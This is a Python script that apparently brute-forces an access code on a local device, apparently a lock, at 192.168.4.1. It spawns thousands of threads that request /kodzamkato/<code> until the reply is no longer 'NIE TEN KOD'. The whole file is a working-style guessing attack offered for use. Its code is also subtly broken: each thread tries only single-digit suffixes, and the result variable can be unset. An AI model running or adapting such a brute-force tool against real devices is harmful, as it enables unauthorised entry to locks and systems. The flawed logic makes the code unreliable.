import httpx
import time
from colorama import Fore, Style
import queue
import threading
from itertools import product

MAX_RETRIES = 10
THREAD_COLORS = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN]

def number_bruteforce(start_num, result_queue, stop_event, tried_numbers):
    thread_num = threading.current_thread().name
    thread_color = get_thread_color(thread_num)
    for i in start_num:
        kod = int(f'5038{i}')
        if kod in tried_numbers:
            continue

        tried_numbers.add(kod)

        retry_count = 0
        while retry_count < MAX_RETRIES:
            print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} Sending GET request: http://192.168.4.1/kodzamkato/{kod}')
            try:
                with httpx.Client(timeout=5) as client:
                    response = client.get(f'http://192.168.4.1/kodzamkato/{kod}')
                print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} Response Content: {response.text} Status Code: {response.status_code}')
                response.raise_for_status()  # Raise an exception for non-successful status codes
                break
            except httpx.RequestError as e:
                print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} Request error: {e}')
                time.sleep(0.5)
            except httpx.HTTPStatusError as e:
                print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} Server response: {response.text}({e.response.status_code})')
                break

            retry_count += 1
            time.sleep(2)

        if response.status_code != 200:
            continue

        print(f'{thread_color}[Thread {thread_num}]{Style.RESET_ALL} {response.text}')
        if response.text != "NIE TEN KOD":
            result_queue.put(i)
            stop_event.set()  # Set the stop event to signal other threads to stop
            break
        time.sleep(0.5)

        if stop_event.is_set():  # Check if stop event is set and break out of the loop
            break
        time.sleep(0.01)

def get_thread_color(thread_num):
    color_index = int(thread_num.split("-")[-1]) % len(THREAD_COLORS)
    return THREAD_COLORS[color_index]

def main():
    num_threads = 4  # Number of threads to use
    result_queue = queue.Queue()
    stop_event = threading.Event()
    tried_numbers = set()

    # Generate combinations
    combinations = product("0123456789", repeat=num_threads)

    # Prompt user to press Enter before starting
    input("Press Enter to start the brute-force process...")

    # Create and start the threads
    threads = []
    for combination in combinations:
        thread_name = "-".join(combination)
        thread = threading.Thread(target=number_bruteforce, args=(combination, result_queue, stop_event, tried_numbers), name=thread_name)
        threads.append(thread)
        thread.start()

    # Wait for a result to be found
    while True:
        try:
            result = result_queue.get(timeout=1)  # Add a timeout to avoid blocking indefinitely
            break
        except queue.Empty:
            if stop_event.is_set():  # Check if stop event is set to break the loop
                break

    # Stop all threads
    stop_event.set()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    if result is not None:
        # Print the found number
        print(f"{Fore.GREEN}Found number: {''.join(result)}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Number not found!{Style.RESET_ALL}")

if __name__ == '__main__':
    main()

